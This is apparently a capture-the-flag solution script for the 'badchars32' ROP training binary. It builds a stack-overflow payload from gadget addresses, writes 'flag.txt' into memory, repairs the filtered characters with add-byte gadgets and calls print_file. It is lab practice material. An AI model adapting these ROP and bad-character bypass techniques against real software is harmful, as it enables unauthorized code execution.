from pwn import *
plt_printfile = 0x080483D0
pop_esi_edi_ebp_ret = 0x080485b9
mov_edi_esi_ret = 0x0804854f
bssaddr = 0x0804A020
add_ebp_bl_ret = 0x08048543
xor_ebp_bl_ret = 0x08048547
pop_ebx_esi_edi_ebp_ret = 0x080485b8


p = process('./badchars32')
#gdb.attach(p,"b *main")
payload = 'A'*0x28 + p32(0) 
payload += p32(pop_esi_edi_ebp_ret)
payload += p32(u32('flag')) 
payload += p32(bssaddr)
payload += p32(0x0)  
payload += p32(mov_edi_esi_ret)  

payload += p32(pop_esi_edi_ebp_ret)
payload += p32(u32('.txt')) 
payload += p32(bssaddr+0x4)
payload += p32(0x0)  
payload += p32(mov_edi_esi_ret)  

payload += p32(pop_ebx_esi_edi_ebp_ret)
payload += p32(0x76)
payload += p32(0x0)   
payload += p32(0x0) 
payload += p32(bssaddr+2)
payload += p32(add_ebp_bl_ret) 

payload += p32(pop_ebx_esi_edi_ebp_ret)
payload += p32(0x7c)
payload += p32(0x0)   
payload += p32(0x0) 
payload += p32(bssaddr+3)
payload += p32(add_ebp_bl_ret) 

payload += p32(pop_ebx_esi_edi_ebp_ret)
payload += p32(0x43)
payload += p32(0x0)   
payload += p32(0x0) 
payload += p32(bssaddr+4)
payload += p32(add_ebp_bl_ret) 

payload += p32(pop_ebx_esi_edi_ebp_ret)
payload += p32(0x8d)
payload += p32(0x0)   
payload += p32(0x0) 
payload += p32(bssaddr+6)
payload += p32(add_ebp_bl_ret) 
 
payload += p32(plt_printfile)
payload += p32(0)
payload += p32(bssaddr)
p.recvuntil('> ')
p.send(payload)
p.interactive()
